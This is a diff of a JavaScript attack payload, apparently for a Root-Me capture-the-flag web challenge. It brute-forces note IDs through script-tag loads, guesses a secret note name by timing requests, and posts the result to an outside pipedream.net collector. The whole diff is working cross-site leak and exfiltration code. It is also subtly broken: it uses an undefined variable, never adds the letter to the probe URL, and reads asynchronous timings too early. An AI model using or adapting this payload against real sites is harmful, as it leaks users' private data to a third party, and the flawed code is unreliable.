@@ -1,25 +1,68 @@
 <script>
+function getKeyOfGreatestElement(dictionary) {
+    let maxKey = null;
+    let maxValue = -Infinity;
+  
+    for (const key in dictionary) {
+      if (dictionary.hasOwnProperty(key)) {
+        const value = dictionary[key];
+        if (value > maxValue) {
+          maxValue = value;
+          maxKey = key;
+        }
+      }
+    }
+  
+    return maxKey;
+  }
+
+let adminId = -1;
+
 function checkId(id) {
     const script = document.createElement('script');
     script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}`;
-    let response = "";
-    script.onload = () => response = id;
+    script.onload = () => {
+        adminId = id;
+    };
     document.body.appendChild(script);
-    return response;
 } 
 
-let firstRequest = new XMLHttpRequest();
-firstRequest.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-firstRequest.send("test=true");
-
+let noteName = "";
+let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn";
 for (let i = 0; i < 10001; i++) {
+    //retrieve admin id
+    checkId(id);
 
-    let resp = checkId(i);
-    if (resp != "") {
+    //find final name
+    if (adminId != -1) {
+        i = 10001;
+        while (noteName.length < 32) {
+            let times = {};
+            for (let j = 0; j < lowercase_letters.length; j++) {
+                const l = lowercase_letters[j];
+                
+                //fetch page
+                var script = document.createElement('script');
+                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}/${noteName}`;
+                document.body.appendChild(script);
+                
+                // Start the clock
+                var start = performance.now();
+                
+                // When script loads, caculate the time it took to finish the request
+                script.onload = () => {
+                    var time = performance.now() - start;
+                    times[l] = time;
+                }
+            }
+            noteName += getKeyOfGreatestElement(times);
+        }
+        
+        //retrieve final name 
         let xhr = new XMLHttpRequest();
         xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-        xhr.send("id="+i);
-        break;
+        xhr.send(`url=https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`);
     }
+    
 }
 </script>
